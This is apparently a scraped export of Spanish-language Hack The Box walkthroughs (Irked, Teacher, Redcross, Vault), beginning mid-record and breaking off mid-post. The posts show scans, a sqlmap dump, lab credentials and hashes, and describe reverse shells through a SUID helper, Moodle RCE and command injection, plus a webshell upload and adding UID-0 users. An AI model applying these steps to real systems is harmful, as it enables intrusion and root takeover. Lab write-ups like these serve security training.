(ECDSA) |_ 256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519) 80/tcp open http Apache httpd 2.4.10 ((Debian)) |_http-server-header: Apache/2.4.10 (Debian) |_http-title: Site doesn\u0026#39;t have a title (text/html). 111/tcp open rpcbind 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/udp rpcbind | 100024 1 47041/udp status |_ 100024 1 48216/tcp status 6697/tcp open irc UnrealIRCd 8067/tcp open irc UnrealIRCd 48216/tcp open status 1 (RPC #100024) 65534/tcp open irc UnrealIRCd No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.70%E=4%D=4/26%OT=22%CT=1%CU=31533%PV=Y%DS=2%DC=T%G=Y%TM=5CC2690 OS:F%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=10D%TI=Z%CI=I%II=I%TS=8)OPS OS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1 OS:1NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN OS:(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N% OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD OS:=S) Network Distance: 2 hops Service Info: Host: irked.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 113/tcp) HOP RTT ADDRESS 1 83.76 ms 10.10.14.1 2 83.73 ms 10.10.10.117 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 2041.57 seconds.   HTTP La pagina inicial nos muestra una imagen y una frase acerca de IRC.\nGOBUSTER Escaneo de directorios y archivos.\n1 2 3 4 5  gobuster -u 10.10.10.117 -w /usr/share/wordlists/dirb/common.txt -q -np -x php,html,txt /index.html (Status: 200) /index.html (Status: 200) /manual (Status: 301) /server-status (Status: 403)   SHELL - UnrealIRCd Para UnrealIRCd existe un backdoor el cual se puede explotar mediante un exploit existente en metasploit quiza el mensaje de la pagina principal se referia a esta vulnerabilidad, vamos configuramos el exploit.\nExploit Payload Obtenemos una Shell con el exploit\nEn el directorio principal carpeta Documents encontramos un archivo llamado .backup con un mensaje y una frase, el mensaje habla acerca de steg que se puede referir a steganography pero no encontramos ninguna imagen en los directorios, en la pagina principal se encuentra una imagen vamos a utilizarla para extraer informacion que pueda esconder dentro.\n1 2  Super elite steg backup pw UPupDOWNdownLRlrBAbaSSss   Stego - IRKED Utilizamos steghide para extraer la informacion dentro de la imagen con la frase y encontramos una contraseña.\nSHELL - Djmardov Utilizamos la contraseña que encontramos en la imagen en ssh, obtenemos nuestra bandera user.txt.\nPRIVILEGE ESCALATION Buscamos archivos SUID para escalar privilegios\nEncontramos un archivo /usr/bin/viewuser que al ejecutarlo nos envia un error donde /tmp/listusers no existe.\nPara obtener una shell root agregamos una shell inversa al archivo que no existe, damos permisos al archivo y lo ejecutamos.\nObtenemos nuestra shell root y nuestra bandera root.txt.\n","description":"","id":91,"section":"posts","tags":["linux"],"title":"Hack The Box - Irked","uri":"https://sckull.github.io/posts/irked/"},{"content":"Teacher es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.\n NMAP Escaneo de puertos TCP\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  Nmap 7.70 scan initiated Thu Apr 18 22:50:41 2019 as: nmap -sT -A -sV -o nmap.scan 10.10.10.153 Nmap scan report for 10.10.10.153 Host is up (0.31s latency). Not shown: 999 closed ports PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.25 ((Debian)) |_http-server-header: Apache/2.4.25 (Debian) |_http-title: Blackhat highschool Device type: WAP Running: Linux 2.4.X OS CPE: cpe:/o:linux:linux_kernel:2.4.20 OS details: Tomato 1.28 (Linux 2.4.20) Network Distance: 2 hops TRACEROUTE (using proto 1/icmp) HOP RTT ADDRESS 1 296.09 ms 10.10.12.1 2 300.57 ms 10.10.10.153 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Thu Apr 18 22:52:41 2019 -- 1 IP address (1 host up) scanned in 120.38 seconds   GOBUSTE 1 2 3 4 5 6 7 8 9 10 11 12 13  gobuster -u http://10.10.10.153 -w /usr/share/wordlists/dirb/common.txt -q -np -x php,html,txt,js -t 15 /css (Status: 301) /fonts (Status: 301) /gallery.html (Status: 200) /images (Status: 301) /index.html (Status: 200) /index.html (Status: 200) /javascript (Status: 301) /js (Status: 301) /manual (Status: 301) /moodle (Status: 301) /phpmyadmin (Status: 403) /server-status (Status: 403)   HTTP Pagina Principal\n/Moodle Login /phpmyadmin /gallery.html En gallery.html encontramos codigo javascript que imprime un mensaje.\nJunto al codigo hay una imagen, pero no podemos verla.\nDescargamos la imagen con curl y nos muestra un mensaje que contiene la imagen.\nNos dice que debemos de encontrar el caracter faltante para la contraseña Th4C00lTheacha del usuario Giovanni.\nBURPSUITE - Giovanni Password Vamos a utilizar burpsuite para encontrar el caracter faltante de la contraseña, utilizando el login de moodle. Para los caracteres utilizamos /usr/share/wordlists/dirb/stress/alphanum_case_extra.txt.\nEncontramos que el caracter faltante para la contraseña es #.\nMoodle Utilizando las credenciales Giovanni y Th4C00lTheacha# logramos ingresar a Moodle.\nEvil Teacher - Reverse Shell Para nuestra version de moodle encontramos una vulnerabilidad que puede injectar codigo, para ello vamos a crear un Quiz en el curso de Algebra y vamos a agregar una formula de matematica la cual nos va a ayudar a inyectar codigo.\nCVE: https://blog.ripstech.com/2018/moodle-remote-code-execution/\nObtenemos una shell como www-data.\nUSER - Giovanni Revisamos los archivos de configuracion para posibles contraseñas de base de datos y encontramos las credenciales de una base de datos en el archivo de configuracion de moodle.\n1 2 3 4 5 6 7 8 9 10 11 12 13  $CFG-\u0026gt;dbtype = \u0026#39;mariadb\u0026#39;; $CFG-\u0026gt;dblibrary = \u0026#39;native\u0026#39;; $CFG-\u0026gt;dbhost = \u0026#39;localhost\u0026#39;; $CFG-\u0026gt;dbname = \u0026#39;moodle\u0026#39;; $CFG-\u0026gt;dbuser = \u0026#39;root\u0026#39;; $CFG-\u0026gt;dbpass = \u0026#39;Welkom1!\u0026#39;; $CFG-\u0026gt;prefix = \u0026#39;mdl_\u0026#39;; $CFG-\u0026gt;dboptions = array ( \u0026#39;dbpersist\u0026#39; =\u0026gt; 0, \u0026#39;dbport\u0026#39; =\u0026gt; 3306, \u0026#39;dbsocket\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;dbcollation\u0026#39; =\u0026gt; \u0026#39;utf8mb4_unicode_ci\u0026#39;, );   Nos conectamos a la base de datos\n1  mariadb -u root -p\u0026#39;Welkom1!\u0026#39; -D moodle   Encontramos una tabla con usuarios y contraseña.\n1  select username,password from mdl_user;select username,password from mdl_user;   Crackeamos la contraseña de Giovanibak en https://crackstation.net/.\n1  7a860966115182402ed06375cf0a22af =\u0026gt; expelled   Utilizamos la contraseña con el usuario Giovanni y obtenemos nuestra bandera user.txt.\nROOT - flag Utilizamos pspy para ver los cron que se ejecutan y encontramos un archivo que se ejecuta cada minuto y realiza un backup de la carpeta courses en el directorio de Giovanni.\n1 2 3 4 5 6 7  /usr/bin/backup.sh #!/bin/bash cd /home/giovanni/work; tar -czvf tmp/backup_courses.tar.gz courses/*; cd tmp; tar -xf backup_courses.tar.gz; chmod 777 * -R;   Para obtener nuestra bandera root.txt vamos a untilizar un symlink y lo vamos a apuntar hacia el directorio /root/ donde esta nuestra bandera para que el archivo cuando se ejecute comprima lo que esta en /root/ al archivo backup_courses.tar.gz y poder descomprimirlo, para ello vamos a renombrar courses.\nLuego de un minuto se crea el archivo backup_courses.tar.gz lo descomprimimos y obtenemos nuestra bandera root.txt.\n","description":"","id":92,"section":"posts","tags":["linux"],"title":"Hack The Box - Teacher","uri":"https://sckull.github.io/posts/teacher/"},{"content":"Redcross es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.\n NMAP Al realizar el primer escaneo a la maquina obtuvimos lo siguiente y al parecer tiene un subdominio (intra).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  Nmap 7.70 scan initiated Mon Jan 14 18:47:33 2019 as: nmap -sC -sV -o tcp 10.10.10.113 Nmap scan report for 10.10.10.113 Host is up (0.22s latency). Not shown: 997 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u3 (protocol 2.0) | ssh-hostkey: | 2048 67:d3:85:f8:ee:b8:06:23:59:d7:75:8e:a2:37:d0:a6 (RSA) | 256 89:b4:65:27:1f:93:72:1a:bc:e3:22:70:90:db:35:96 (ECDSA) |_ 256 66:bd:a1:1c:32:74:32:e2:e6:64:e8:a5:25:1b:4d:67 (ED25519) 80/tcp open http Apache httpd 2.4.25 |_http-server-header: Apache/2.4.25 (Debian) |_http-title: Did not follow redirect to https://intra.redcross.htb/ 443/tcp open ssl/http Apache httpd 2.4.25 |_http-server-header: Apache/2.4.25 (Debian) |_http-title: Did not follow redirect to https://intra.redcross.htb/ | ssl-cert: Subject: commonName=intra.redcross.htb/organizationName=Red Cross International/stateOrProvinceName=NY/countryName=US | Not valid before: 2018-06-03T19:46:58 |_Not valid after: 2021-02-27T19:46:58 |_ssl-date: TLS randomness does not represent time | tls-alpn: | http/1.1 http/1.1 (1000 Lineas de lo mismo) |_ http/1.1 Service Info: Host: redcross.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Mon Jan 14 19:47:25 2019 -- 1 IP address (1 host up) scanned in 3592.63 seconds   Subdominios Agregamos el subdominio intra a nuestro archivo local /etc/hosts.\n1  10.10.10.113\tredcross.htb intra.redcross.htb   Al visitar intra.redcross.htb nos muestra un login, podemos probar contraseñas comunes o seguir enumerando la pagina, en este caso el usuario:contraseña que encontramos fue: guest:guest.\nGOBUSTER  Realizamos una busqueda de los directorios y archivos (php,html,txt,pdf,doc) que podrian estar en la pagina, utilizamos el parametro \u0026lsquo;-k\u0026rsquo; saltarnos la verificacion de SSL de la pagina (-k Skip SSL certificate verification).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  gobuster -u https://intra.redcross.htb -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -k -np -t 30 -x php,html,txt,pdf,doc ===================================================== Gobuster v2.0.0 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : https://intra.redcross.htb/ [+] Threads : 30 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Extensions : php,html,txt,pdf,doc [+] Timeout : 10s ===================================================== /documentation (Status: 301) /images (Status: 301) /index.php (Status: 302) /index.php (Status: 302) /init.php (Status: 200) /javascript (Status: 301) /pages (Status: 301) =====================================================   Se realizo de la misma manera para el directorio /documentation y nos encontramos con un documento.\n1 2 3 4  gobuster -u https://intra.redcross.htb -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -k -np -t 30 -x php,html,txt,pdf,doc ===================================================== account-signup.pdf =====================================================   Nos dice que si queremos un acceso a la plataforma debemos llenar un formulario en https://intra.redcross.htb/?page=contact con subject \u0026ldquo;credentials\u0026rdquo; y en el cuerpo del formulario la contraseña del usuario que queremos.\nSQLI Nos logueamos con el usuario y contraseña, al analizar los directorios y paginas, encontramos una vulnerabilidad SQLi en: https://intra.redcross.htb/?o=1'-- -\u0026amp;page=app\nUtilizamos burpsuite para capturar el trafico y capturar una solicitud de la SQLi para luego hacer uso de sqlmap con la solicitud, para luego encontrar usuarios y contraseñas, tambien encontramos mensajes de correos electronicos entre los administradores.\n1 2 3 4 5 6 7 8 9 10  GET /?o=1\u0026amp;page=app HTTP/1.1 Host: intra.redcross.htb User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: https://intra.redcross.htb/?page=app Cookie: PHPSESSID=vo690q6cktgv56j97dabra5bm3; LANG=EN_US; SINCE=1547616286; LIMIT=10; DOMAIN=intra Connection: close Upgrade-Insecure-Requests: 1   SQLMAP 1  sqlmap -r sql.req --batch --level=5 --risk=3 -D redcross -T users --dump   1 2 3 4 5 6 7 8 9 10 11 12  Database: redcross Table: users [5 entries] +----+------+------------------------------+----------+--------------------------------------------------------------+ | id | role | mail | username | password | +----+------+------------------------------+----------+--------------------------------------------------------------+ | 1 | 0 | admin@redcross.htb | admin | $2y$10$z/d5GiwZuFqjY1jRiKIPzuPXKt0SthLOyU438ajqRBtrb7ZADpwq. | | 2 | 1 | penelope@redcross.htb | penelope | $2y$10$tY9Y955kyFB37GnW4xrC0.J.FzmkrQhxD..vKCQICvwOEgwfxqgAS | | 3 | 1 | charles@redcross.htb | charles | $2y$10$bj5Qh0AbUM5wHeu/lTfjg.xPxjRQkqU6T8cs683Eus/Y89GHs.G7i | | 4 | 100 | tricia.wanderloo@contoso.com | tricia | $2y$10$Dnv/b2ZBca2O4cp0fsBbjeQ/0HnhvJ7WrC/ZN3K7QKqTa9SSKP6r. | | 5 | 1000 | non@available | guest | $2y$10$U16O2Ylt/uFtzlVbDIzJ8us9ts8f9ITWoPAWcUfK585sZue03YBAi | +----+------+------------------------------+----------+--------------------------------------------------------------+   1 2 3 4 5 6 7 8 9 10 11 12  Database: redcross Table: messages [8 entries] id,body,dest,origin,subject 1,You\u0026#39;re granted with a low privilege access while we\u0026#39;re processing your credentials request. Our messaging system still in beta status. Please report if you find any incidence.,5,1,Guest Account Info 2,\u0026#34;Hi Penny, can you check if is there any problem with the order? I\u0026#39;m not receiving it in our EDI platform.\u0026#34;,2,4,Problems with order 02122128 3,\u0026#34;Please could you check the admin webpanel? idk what happens but when I\u0026#39;m checking the messages, alerts popping everywhere!! Maybe a virus?\u0026#34;,3,1,Strange behavior 4,\u0026#34;Hi, Please check now... Should be arrived in your systems. Please confirm me. Regards.\u0026#34;,4,2,Problems with order 02122128 5,\u0026#34;Hey, my chief contacted me complaining about some problem in the admin webapp. I thought that you reinforced security on it... Alerts everywhere!!\u0026#34;,2,3,admin subd webapp problems 6,\u0026#34;Hi, Yes it\u0026#39;s strange because we applied some input filtering on the contact form. Let me check it. I\u0026#39;ll take care of that since now! KR\u0026#34;,3,2,admin subd webapp problems (priority) 7,\u0026#34;Hi, Please stop checking messages from intra platform, it\u0026#39;s possible that there is a vuln on your admin side... \u0026#34;,1,2,STOP checking messages from intra (priority) 8,Sorry but I can\u0026#39;t do that. It\u0026#39;s the only way we have to communicate with partners and we are overloaded. Doesn\u0026#39;t look so bad... besides that what colud happen? Don\u0026#39;t worry but fix it ASAP.,2,1,STOP checking messages from intra (priority)   Con la vulnerabilidad SQLi solo se pudo sacar mensajes y usuarios, no se pudo ir más alla (shell, lectura, escritura de archivos,etc). Intentando crackear las contraseñas con hashcat solo logramos sacar dos pero no sirvieron de mucho:\n1 2  guest:$2y$10$U16O2Ylt/uFtzlVbDIzJ8us9ts8f9ITWoPAWcUfK585sZue03YBAi:guest charles:$2y$10$bj5Qh0AbUM5wHeu/lTfjg.xPxjRQkqU6T8cs683Eus/Y89GHs.G7i:cookiemonster   Pero los mensajes nos dan una idea de lo que podriamos hacer, hablan de admin webpanel el cual no pudimos encontrar con gobuster, pero podria ser algo más que un directorio, un subdominio.\n1  10.10.10.113\tredcross.htb intra.redcross.htb admin.redcross.htb webpanel.redcross.htb   Al visitar webpanel.redcross.htb solo nos redirige de nuevo a intra.redcross.htb, pero si visitamos admin.redcross.htb, nos muestra un nuevo panel de administracion.\nIntentamos utilizar los mismos credenciales pero nos muestra un mensaje:\n1  Not enough privileges!   COOKIES Ya que el subdominio intra y admin pertenecen a la misma maquina intentamos utilizar las cookies del subdominio intra en el de admin utilizando Cookie Manager con los cuales pudimos logearnos como usuario guest.\nObservamos dos User Management, Network Access, en la primera opcion podemos borrar y agregar usuarios, y el server nos genera una contraseña que podemos utilizar para logearnos mediante ssh.\nAgregamos un Usuario\nNos devuelve el usuario y contraseña\nNos logeamos con las credenciales al servicio ssh\nCon el usuario que creamos(nemesis) no pudimos hacer mucho, pero encontramos un archivo \u0026lsquo;iptctl.c\u0026rsquo;, el cual restringe o permite el acceso a la maquina, añadiendo una IP.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114  /* * Small utility to manage iptables, easily executable from admin.redcross.htb * v0.1 - allow and restrict mode * v0.3 - added check method and interactive mode (still testing!) */ #include \u0026lt;stdio.h\u0026gt;#include \u0026lt;stdlib.h\u0026gt;#include \u0026lt;string.h\u0026gt;#include \u0026lt;arpa/inet.h\u0026gt;#include \u0026lt;unistd.h\u0026gt;#define BUFFSIZE 360  int isValidIpAddress(char *ipAddress) { struct sockaddr_in sa; int result = inet_pton(AF_INET, ipAddress, \u0026amp;(sa.sin_addr)); return result != 0; } int isValidAction(char *action){ int a=0; char value[10]; strncpy(value,action,9); if(strstr(value,\u0026#34;allow\u0026#34;)) a=1; if(strstr(value,\u0026#34;restrict\u0026#34;)) a=2; if(strstr(value,\u0026#34;show\u0026#34;)) a=3; return a; } void cmdAR(char **a, char *action, char *ip){ a[0]=\u0026#34;/sbin/iptables\u0026#34;; a[1]=action; a[2]=\u0026#34;INPUT\u0026#34;; a[3]=\u0026#34;-p\u0026#34;; a[4]=\u0026#34;all\u0026#34;; a[5]=\u0026#34;-s\u0026#34;; a[6]=ip; a[7]=\u0026#34;-j\u0026#34;; a[8]=\u0026#34;ACCEPT\u0026#34;; a[9]=NULL; return; } void cmdShow(char **a){ a[0]=\u0026#34;/sbin/iptables\u0026#34; ; a[1]=\u0026#34;-L\u0026#34;; a[2]=\u0026#34;INPUT\u0026#34;; return; } void interactive(char *ip, char *action, char *name){ char inputAddress[16]; char inputAction[10]; printf(\u0026#34;Entering interactive mode\\n\u0026#34;); printf(\u0026#34;Action(allow|restrict|show): \u0026#34;); fgets(inputAction,BUFFSIZE,stdin); fflush(stdin); printf(\u0026#34;IP address: \u0026#34;); fgets(inputAddress,BUFFSIZE,stdin); fflush(stdin); inputAddress[strlen(inputAddress)-1] = 0; if(! isValidAction(inputAction) || ! isValidIpAddress(inputAddress)){ printf(\u0026#34;Usage: %s allow|restrict|show IP\\n\u0026#34;, name); exit(0); } strcpy(ip, inputAddress); strcpy(action, inputAction); return; } int main(int argc, char *argv[]){ int isAction=0; int isIPAddr=0; pid_t child_pid; char inputAction[10]; char inputAddress[16]; char *args[10]; char buffer[200]; if(argc!=3 \u0026amp;\u0026amp; argc!=2){ printf(\u0026#34;Usage: %s allow|restrict|show IP_ADDR\\n\u0026#34;, argv[0]); exit(0); } if(argc==2){ if(strstr(argv[1],\u0026#34;-i\u0026#34;)) interactive(inputAddress, inputAction, argv[0]); } else{ strcpy(inputAction, argv[1]); strcpy(inputAddress, argv[2]); } isAction=isValidAction(inputAction); isIPAddr=isValidIpAddress(inputAddress); if(!isAction || !isIPAddr){ printf(\u0026#34;Usage: %s allow|restrict|show IP\\n\u0026#34;, argv[0]); exit(0); } puts(\u0026#34;DEBUG: All checks passed... Executing iptables\u0026#34;); if(isAction==1) cmdAR(args,\u0026#34;-A\u0026#34;,inputAddress); if(isAction==2) cmdAR(args,\u0026#34;-D\u0026#34;,inputAddress); if(isAction==3) cmdShow(args); child_pid=fork(); if(child_pid==0){ setuid(0); execvp(args[0],args); exit(0); } else{ if(isAction==1) printf(\u0026#34;Network access granted to %s\\n\u0026#34;,inputAddress); if(isAction==2) printf(\u0026#34;Network access restricted to %s\\n\u0026#34;,inputAddress); if(isAction==3) puts(\u0026#34;ERR: Function not available!\\n\u0026#34;); } }   Este archivo es utilizado en la segunda opcion del panel de administracion en Network Access, al acceder a la segunda opcion nos muestra las ip que fueron agregada a la lista, en la que tambien podemos denegar el acceso a una IP.\nRCE - Reverse SHELL El archivo que encontramos anteriormente fue compilado y probado localmente, el cual nos pide una opcion y una IP a la cual queremos autorizar|restringir|mostrar y al realizar un analisis a las peticiones al servidor con \u0026lsquo;Burpsuite\u0026rsquo; de esta pagina encontramos que podemos realizar una \u0026lsquo;Inyeccion de Comandos\u0026rsquo; mediante la opcion de denegar (\u0026lsquo;deny\u0026rsquo;) una IP y asi obtener una shell inversa con python.\nINFO=\u0026gt;https://www.owasp.org/index.php/Command_Injection\nYour browser does not support the video tag.  DIRECTORIOS PAGINA WEB Ya dentro de la maquina pudimos enumerar y descargar los archivos pertenecientes a la pagina web y su estructura es la siguiente.\nPRIVILEGE ESCALATION Creando un Usuario - ROOT Enumerando los archivos que se manejan en /var/www/html/* los cuales pertenecen a la pagina web de la maquina, encontramos varios usuarios y contraseñas a Bases de Datos.\n1 2 3 4  actions.php \u0026#34;host=127.0.0.1 dbname=unix user=unixusrmgr password=dheu%7wjx8B\u0026amp;\u0026#34; \u0026#34;host=127.0.0.1 dbname=redcross user=www password=aXwrtUO9_aa\u0026amp;\u0026#34; \u0026#34;host=127.0.0.1 dbname=unix user=unixnss password=fios@ew023xnw\u0026#34;   1 2  init.php $dbhost=\u0026#39;127.0.0.1\u0026#39;; $dbuser=\u0026#39;dbcross\u0026#39;; $dbpass=\u0026#39;LOSPxnme4f5pH5wp\u0026#39;;$dbname=\u0026#39;redcross\u0026#39;;   Como pudimos observar, en el panel de administracion podemos crear usuarios, los cuales estan en el grupo de asociados y limitados a una sola carpeta /var/jail/. El codigo php que agrega usuarios a la base de datos.\n1 2 3 4 5 6 7 8 9 10  if($action===\u0026#39;adduser\u0026#39;){ $username=$_POST[\u0026#39;username\u0026#39;]; $passw=generateRandomString(); $phash=crypt($passw); $dbconn = pg_connect(\u0026#34;host=127.0.0.1 dbname=unix user=unixusrmgr password=dheu%7wjx8B\u0026amp;\u0026#34;); $result = pg_prepare($dbconn, \u0026#34;q1\u0026#34;, \u0026#34;insert into passwd_table (username, passwd, gid, homedir) values ($1, $2, 1001, \u0026#39;/var/jail/home\u0026#39;)\u0026#34;); $result = pg_execute($dbconn, \u0026#34;q1\u0026#34;, array($username, $phash)); echo \u0026#34;Provide this credentials to the user:\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026#34;; \u0026lt;--!echo \u0026#34;\u0026lt;b\u0026gt;$username : $passw\u0026lt;/b\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;a href=/?page=users\u0026gt;Continue\u0026lt;/a\u0026gt;\u0026#34;;--\u0026gt; }   El action: adduser realiza una conexion a la base de datos unix y con el usuario \u0026lsquo;unixusrmgr\u0026rsquo; y realiza un query para insertar nombre de usuario, contraseña generada aleatoriamente y la encripta en crypt, gid o al grupo de usuarios que existen en la maquina (/etc/group - associates❌1001:), tambien un directorio especifico para el usuario. Sabiendo esto podemos tomar ventaja de esta funcion y crear nuestro propio usuario.\nUtilizando las mismas credenciales en la base de datos en la que se crean los usuarios, encontramos la tabla llamada passwd_table, que contiene:\n1 2 3 4 5 6 7 8 9  username | passwd | uid | gid | gecos | homedir | shell ---------------+------------------------------------+------+------+-------+----------------+----------- ...\t....\t...\t...\t....\t....\t... greater | $1$bRaICuCW$oRz.QUxie1yqP5Jbi3Z1v/ | 2022 | 0 | | /root | /bin/bash mailadm | $1$bRaICuCW$oRz.QUxie1yqP5Jbi3Z1v/ | 2024 | 1000 | | /home/penelope | /bin/bash slot | $1$Zjw7H894$4mUPW1tgQmV5QVKUIOeKZ/ | 2027 | 1001 | | /var/jail/home | /bin/bash shadow | $1$bRaICuCW$oRz.QUxie1yqP5Jbi3Z1v/ | 2029 | 42 | | /home/ | /bin/bash goku | $1$bRaICuCW$oRz.QUxie1yqP5Jbi3Z1v/ | 2033 | 27 | | /home/ | /bin/bash adm | $1$Ca4NB5YL$1VBlUqIoGQg.LSqbiZ7FY/ | 2034 | 4 | | /home/penelope | /bin/bash   Ya que el usuario unixusrmgr tiene permisos para insertar datos en esta tabla, podemos tomar ventaja e insertar nuestro propio usuario con permisos sudo a la base de datos, logearnos mediante ssh para luego poder crear y agregar un usuario con permisos(gid) root a la maquina.\n1 2  /usr/lib/postgresql/9.6/bin/psql -h 127.0.0.1 -U unixusrmgr unix Password: dheu%7wjx8B\u0026amp;   Para crear la contraseña utilizamos la siguiente pagina: https://es.functions-online.com/crypt.html\n1  $1$Ca4NB5YL$1VBlUqIoGQg.LSqbiZ7FY/:greatstuff   SQL - INSERT 1  insert into passwd_table(username, passwd, gid, homedir) values(\u0026#39;batman\u0026#39;, \u0026#39;$1$Ca4NB5YL$1VBlUqIoGQg.LSqbiZ7FY/\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;/root\u0026#39;);   Crear Usuario Sudo 1 2 3  sudo useradd -ou 0 -g 0 happy sudo passwd happy su happy   INFO=\u0026gt;https://www.shellhacks.com/how-to-grant-root-access-user-root-privileges-linux/\nYour browser does not support the video tag.  Sudo ¯_(ツ)_/¯ Pudimos haber hecho solamente sudo bash y obteniamos una shell root #meh.\n","description":"","id":93,"section":"posts","tags":["linux"],"title":"Hack The Box - Redcross","uri":"https://sckull.github.io/posts/redcross/"},{"content":"Vault es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.\n MASSCAN Escaneo a todos los puertos UDP/TCP.\n1 2 3 4 5 6  Starting masscan 1.0.4 (http://bit.ly/14GZzcT) -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 22/tcp on 10.10.10.109 Discovered open port 80/tcp on 10.10.10.109   NMAP Escaneo a puertos 22, 80.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  Starting Nmap 7.70 ( https://nmap.org ) Nmap scan report for 10.10.10.109 Host is up (0.42s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 a6:9d:0f:7d:73:75:bb:a8:94:0a:b7:e3:fe:1f:24:f4 (RSA) | 256 2c:7c:34:eb:3a:eb:04:03:ac:48:28:54:09:74:3d:27 (ECDSA) |_ 256 98:42:5f:ad:87:22:92:6d:72:e6:66:6c:82:c1:09:83 (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Site doesn\u0026#39;t have a title (text/html; charset=UTF-8). Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 13.97 seconds   HTTP Puerto 80 http encontramos una pagina solo con el siguiente contenido, en el que anuncian a un nuevo cliente \u0026lsquo;Sparklays\u0026rsquo; pero su pagina (Sparklays.com) aun esta en construccion por lo que no puede ser accedida.\nAgregamos todas las palabras posibles del contenido de la pagina a un diccionario para gobuster utilizando cewl.\n1  cewl -w vault_custom.txt http://10.10.10.109/ \u0026amp;\u0026amp; tr \u0026#39;A-Z\u0026#39; \u0026#39;a-z\u0026#39; \u0026lt; vault_custom.txt \u0026gt; vault_lower.txt \u0026amp;\u0026amp; cat vault_custom.txt vault_lower.txt \u0026gt;\u0026gt; /usr/share/wordlist/dirb/common.txt   DIRBUSTER Utilizando dirbuster encontramos las siguientes rutas.\n/admin.php /login.php /design/design.html /design/changelogo.php /design/uploads/ SIMPLE PHP SHELL Para obtener una shell vamos a concentrarnos en changelogo.php es la unica ruta donde podemos subir archivos y considerando que, al subir un archivo se guarda en /uploads/ podremos ejecutar nuestro payload o comandos, para ello vamos a copiar un webshell que kali trae en su sistema.\nEnumerando los directorios nos encontramos con un archivo ssh que contiene el nombre de Dave y un aposible contraseña para el servicio ssh.\nSHELL - SSH Satisfactoriamente nos logeamos con las credenciales para el usuario dave.\nDentro de los archivos de dave encontramos dos archivos mas key y Servers.\nServers contiene IPs y el nombre que tiene cada una de ellas, y en key una \u0026ldquo;contraseña\u0026rdquo;, nmap no esta instalado en la maquina por lo que vamos a utilizar netcat para hacer un escaneo de los puertos de cada ip que nos aparece en el archivo Servers.\nNETCAT =\u0026gt; https://www.cyberciti.biz/faq/linux-port-scanning/\nDentro de las interfaces encontramos una interna en la cual nos identificamos con la ip 192.168.122.1.\nPrimero verificamos si hay mas de una IP disponible en un rango del 1 al 10.\nAhora sabemos que existen otras dos IP dentro de la interfaz 